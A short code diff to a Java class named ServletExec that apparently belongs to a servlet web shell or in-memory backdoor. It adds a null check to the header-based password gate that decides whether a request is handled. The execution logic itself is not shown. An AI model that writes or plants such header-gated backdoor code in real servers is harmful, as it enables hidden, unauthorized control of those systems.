@@ -34,7 +34,8 @@ public class ServletExec implements InvocationHandler {
 
     private void run(Object servletRequest, Object servletResponse) {
         try {
-            if(!((String)invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+            String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
+            if(lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
             Object header = invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
